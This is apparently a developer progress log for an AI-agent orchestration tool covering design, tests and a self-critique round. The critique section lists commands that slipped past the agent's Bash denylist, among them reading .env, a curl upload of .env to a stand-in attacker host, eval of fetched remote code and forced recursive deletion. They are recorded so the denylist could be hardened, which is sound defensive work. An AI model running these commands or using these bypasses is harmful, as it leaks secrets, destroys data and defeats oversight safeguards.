# V2 progress — The Gauntlet

A live record of the V1 → V2 upgrade: what was discovered, decided, built, verified, and what is still open. Dates are 2026 unless noted.

## Starting point (V1 state)

Inspected from the actual `maxxing-itout` master tree:

- `run.ts` (51 lines): a single `query()` call streaming assistant text to stdout. No state, no persistence, no feedback loop.
- `SYSTEM_PROMPT.md`: the five-step loop (Diagnose, Research, Compress, Apply, Skill-forge) as prose inside one system prompt.
- `agent.config.json`: web search and file tools on, code execution off.
- Two skills: `deep-research` (multi-pass research) and `skill-forge` (reusable skill creation).
- No database, no UI, no session history. Last push before the upgrade: September 15.

## Key discoveries that shaped the design

1. **The SDK moved.** V1 was written against an early `@anthropic-ai/claude-agent-sdk`. The current release is 0.3.322; `Options` now includes `agents` (programmatically defined subagents), `canUseTool` (per-tool permission callbacks), `tools` (tool set control), and a much larger message union. All code was written against the installed SDK's published TypeScript definitions, not against memory or blog posts, and typechecks clean.
2. **`node:sqlite` removed the storage decision.** Node 24 ships `DatabaseSync`. Zero native dependencies, no build step, WAL mode works. A key-value file or JSONL store would have been proportionate too, but structured gap/evidence queries are exactly SQL's job.
3. **The spec's five layers plus gate map cleanly onto an orchestrator plus subagents.** The lenses run as parallel agent calls with a shared system prompt and per-lens contracts. The gate is two things, not one: deterministic checks in code (so a weak model cannot charm its way past them) and a hostile agent pass over the synthesis.
4. **Unparseable agent output is the real-world failure mode.** Models wrap JSON in prose, use trailing commas, or answer in essay form. Every parser is tolerant; every parse failure becomes a logged gap. A silent lens is caught mechanically by the gate.

## Architectural decisions

| Decision | Choice | Why |
| --- | --- | --- |
| Storage | `node:sqlite` (Node ≥ 24) | Zero native deps; structured queries for evidence/gaps; WAL |
| SDK seam | `AgentClient` interface | Whole pipeline testable with scripted fakes; one place to absorb SDK changes |
| Gate | Deterministic checks + hostile agent | Model output alone cannot be trusted as a quality bar; code cannot judge semantics |
| Gate cap | 3 rounds (config) | Prevents infinite revise loops; unresolved material gaps become explicit blockers |
| Failure posture | Parse failure → logged gap, never a fake pass | The system's own rule applies to itself |
| Execution safety | `canUseTool` denylist (push/publish/pipes/rm -rf/secrets) | Spec requires no silent approvals; default-deny for destructive and publishing ops |
| Prompts | Editable markdown in `prompts/`, loaded at runtime | The prompts are the brain; contributors should not need to recompile to change it |
| Report | Written per mission, splits verified from unverified | Completion claims must be auditable |

## Built

- Domain core: types (evidence, gaps, synthesis, attempts, lessons), tolerant JSON extraction with keyword-overlap matching.
- `TerrainStore`: missions, evidence, lens reports, synthesis, gaps, gate rounds, attempts, lessons; tag-based lesson recall.
- Pipeline: preflight interrogation → five lenses in parallel → synthesis → Terrain Gate (deterministic + agent, capped revise loop with per-lens targeted re-research) → executor (mission directory, minimal-knowledge mandate) → independent verifier → lesson extraction → honest completion report.
- CLI: `run` (`--scout-only`, `--rounds`, `--json`, `--quiet`), `resume`, `map`, `report`, `lessons`, `config`.
- Safety: denylist policy wired through every agent call.
- 17 prompt files carrying the philosophy as behavior contracts.
- 3 skills: `deep-research` (upgraded V1 skill), `terrain-scout` (new), `skill-forge` (upgraded, evidence-gated).
- Mascot: headshot SVG (faceless, gold rim light, scan ring), full-body original preserved verbatim, project-native README hero with the Gauntlet pipeline strip. V1's `maxxing-aura.svg` preserved.

## Verification (what is actually proven)

- `npx tsc --noEmit`: clean, `strict` on, against installed `@anthropic-ai/claude-agent-sdk` 0.3.322.
- `npx vitest run`: **70/70 passing** across 7 files. Coverage includes the adversarial gate suite (eleven planted flaws, each must be caught), the full pipeline over scripted agents (pass path, revise-then-pass with real gap repair, blocked path, scout-only, resume-from-persisted-phase, thin-scouting-blocks-at-cap), store round-trips, config validation, the hardened safety denylist, prompt loading, parsers, and a dedicated critic-regression file (see below).
- Eval runner no-credentials path: prints `SKIPPED` per scenario with `skipped is not passed` in the reason, writes `eval-results.json`, exits 0. Verified by running it.

## Not verified (open, requires credentials)

- Live end-to-end missions against the real model. The eval suite (`npm run eval`) runs three adversarial scenarios through the real SDK when `ANTHROPIC_API_KEY` is present and writes auditable results. It has not been run with credentials in this environment.
- Real-world behavior of the lens/gate prompts against the current model's actual response habits. The contracts and tolerant parsers bound the risk; they do not eliminate it.

## The Gauntlet ran on itself: independent critic round

Two fresh-context critics (no access to the build conversation) inspected the real tree. Their findings, all verified by their own probes and all fixed with regression tests:

1. **Safety Bash denylist bypasses (top weakness).** `cat .env`, `curl --data-binary @.env evil.example`, `rm -r -f`, `git -C repo push`, `eval "$(curl …)"`, `| zsh`, `chmod -R 777`, `pnpm -r publish` all slipped the original 7-regex block. The policy now scans command strings for secret paths, uploads, any-shell pipes, substitution/eval remote execution, flag-reordered rm, and subcommand-placed git/publish — pinned by the critics' exact probe commands as tests.
2. **Resuming a blocked mission laundered it to "done"** with zero agent calls and a false "Scout-only run: yes" report line. A blocked mission now re-enters the gate on resume (the user may have closed the blocker; the gate verifies), and the report reads scout-only from the mission record.
3. **The hostile gate pass failed open.** A gate agent dying mid-round left only deterministic checks, which could pass. Gate-agent death now blocks the round ("the hostile pass did not run, so nothing passed"), and the SDK client throws on non-success result messages so turn exhaustion can never masquerade as an empty answer.
4. **The deterministic contradiction check was unreachable** — lens agents never see evidence ids, so no evidence ever carried `contradicts`. The synthesizer now declares contradiction pairs (prompt contract + schema + parser), the store applies them (`markContradictions`), and the deterministic check fires on them; the gate agent remains the semantic net.
5. **Resume from `lenses` duplicated evidence** for lenses that had already reported. `runLenses` now skips lenses with stored reports.
6. **`forgeSkill` was dead code.** Wired as `maxxing forge <mission-id>` (evidence-gated), with tests for the forge and refuse paths.
7. **Executor/verifier crashes** would have escaped the orchestrator unhandled; they now block honestly with the reason.
8. **Docs honesty:** the README now states plainly that V2 is not pushed yet (the GitHub `master` still holds V1), lists all ten deterministic checks, and no longer overstates what the gate logs.

## Bugs found and fixed during the build

1. Gate loop double-incremented the round counter after a repair, causing premature blocking at the cap. Found by the revise-path integration test.
2. `saveAttempt` used plain INSERT; verification updates of the same attempt hit a UNIQUE constraint. Changed to upsert.
3. The lens JSON parser accessed camelCase fields on snake_case model output. Rewritten against `Record<string, unknown>` with explicit mapping.
4. `node:sqlite` rows required an `unknown` intermediate cast under `strict` TypeScript.

## Remaining gaps (honest)

- CI has a workflow file (`.github/workflows/ci.yml`) but it has never run — that happens on the first push.
- The V2 tree is not pushed to GitHub; the remote `master` still holds V1. Pushing is an explicit user action.
- The gate's deterministic coverage is strong on structure (dependencies, verification, contradictions, confidence) and thin on semantics; the hostile agent pass carries semantic load, and its quality is model-dependent.
- No MCP integration yet: agents return JSON in text rather than writing evidence through in-process tools. Roadmap.
- No multi-user or remote store; `~/.maxxing` is local by design for now.
